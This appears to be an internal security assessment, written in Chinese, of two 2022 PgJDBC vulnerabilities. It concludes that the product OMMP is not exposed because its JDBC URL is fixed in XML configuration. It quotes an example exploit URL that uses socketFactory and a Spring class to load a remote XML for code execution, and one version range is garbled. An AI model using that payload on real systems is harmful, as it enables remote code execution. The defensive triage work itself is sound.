# postgresql漏洞版本
2022年2月，PostgreSQL JDBC Driver（简称 PgJDBC）官方发布多个漏洞公告。其中包括 PostgreSQL JDBC Driver 任意代码执行漏洞、PostgreSQL JDBC Driver 任意文件写入漏洞（CVE-2022-21724、QVD-2022-1479）。
PostgreSQL JDBC Driver 任意代码执行漏洞（CVE-2022-21724）：PgJDBC 驱动程序根据 authenticationPluginClassName、sslhostnameverifier、socketFactory、sslfactory、sslpasswordcallback 连接属性中提供的类名进行实例化，若受害机器可通外网，且 JDBC 连接 URL 属性可控，未经授权的远程攻击者利用该漏洞可加载任意类导致代码执行。
PostgreSQL JDBC Driver 任意文件写入漏洞（QVD-2022-1479）：PgJDBC 驱动程序从 42.0.0 版本开始支持使用日志记录（或跟踪）错误，来帮助开发人员解决应用程序在使用 PgJDBC 驱动程序时出现各种问题。在使用 PgJDBC 驱动连接 postgresql 数据库时，可以通过 loggerLevel 和 loggerFile 参数声明日志级别和日志输出文件，loggerFile 参数不指定目录时默认在当前目录下创建日志文件。当连接 PostgreSQL 数据库的 URL 或参数（loggerLevel、loggerFile）可控时，即可写入任意文件。
【漏洞等级】
高危
【影响范围】
* <= PgJDBC < 42.2.25
42.3.0 <= PgJDBC < 42.3.3 
经过初步分析，多媒体产品使用postgres数据库客户端的网元所使用的PgJDBC版本均在影响范围内，范围非常大。

OMMP目前使用版本
postgresql-42.2.19.jar

问题分析（被攻击条件）：
当攻击者控制 jdbc url 
若受害机器可通外网
JDBC 连接属性可控
实例：
这是一个使用 Spring Framework 中的开箱即用类的示例攻击：
```
DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");
```
第一个受影响的版本是 REL9.4.1208（它引入了socketFactory连接属性）
结论：在OMMP中jdbcURL是写死在xml文件中，通过解析xml文件的方式来加载驱动连接数据库驱动，因此不会收到外部jdbcURL的控制，也不会填入属性，因此不涉及此项漏洞

OMMP数据库获取驱动的方法：
获取URL的路径为
从配置文件中获取信息
    ```
     //获取数据库连接信息
     // @param filename 配置文件
    
    public static boolean getDbConnectionInfo(String filename) {
        boolean ret = false;
        if (filename == null || "".equals(filename)) {
            return false;
        }
        try {
            // 使用builder创建文档对象
            SAXBuilder builder = new SAXBuilder();
            Document doc = builder.build(filename);
            // 获取根元素 <config>
            Element root = doc.getRootElement();
            if (root != null) {
                // 获取子元素<db>
                Element db = root.getChild("db");
                // 若<db>元素不为空
                if (db != null) {
                    // <db><scpnum>3</scpnum></db> 获取scpnum标签的文本内容
                    int dbNum = Integer.parseInt(db.getChildText("scpnum"));
                    // 循环配置文件中所有连接池 <scpdb>
                    for (int i = 1; i <= dbNum; i++) {
                        Element scpdb = db.getChild("scpdb" + i);
                        if (scpdb != null) {
                            // 获取<scpdb>-><scpid>节点元素的文本内容 连接池名称 poolName = omm 连接池
                            if ("omm".equals(scpdb.getChildText("scpid"))) {
                                String url = scpdb.getChildText("url");
                                if (!(url == null || "".equals(url))) {
                                    // 处理数据库链接 url mariadb驱动
                                    if (url.contains("mariadb")) {
                                    	if(url.contains("useSSL=true"))ssl=true;
                                        mariaDbUrlHandler(scpdb, url);
                                        ret = true;
                                        break;
                                    }
                                    // 处理数据库链接 url postgresql驱动
                                    if (url.contains("postgresql")) {
                                        pgSqlUrlHandler(scpdb, url);
                                        ret = true;
                                        break;
                                    }
                                    // 处理数据库链接 url sybase 驱动
                                    if (url.contains("sybase")) {
                                        sybaseSqlUrlHandler(scpdb, url);
                                        ret = true;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    ```
 最终组合url
```

      if (dbType == DbType.DB_TYPE_PGSQL && null != dbName) {
            url.append("jdbc:postgresql://").append(ip).append(":").append(port).append("/").append(dbName)
                    .append("?").append("user=").append(username).append("&password=").append(password)
                    .append("&useUnicode=true&characterEncoding=UTF8");
        }
```
连接驱动信息
```
    /**
     * 获取数据库链接
     *
     * @return Connection
     */
    public static Connection getConnection() {
        if (connection == null) {
            try {
                connection = DriverManager.getConnection(ConfigXmlParseUtil.getUrl());
                LOGGER.info("get connection successfully");
            } catch (SQLException e) {
                LOGGER.error("get connection failed", e);
            }
        }
        return connection;
    }
```
PostgreSQL JDBC Driver 任意文件写入漏洞（QVD-2022-1479）
因为不涉及可控jdbcURL不会产生这项漏洞
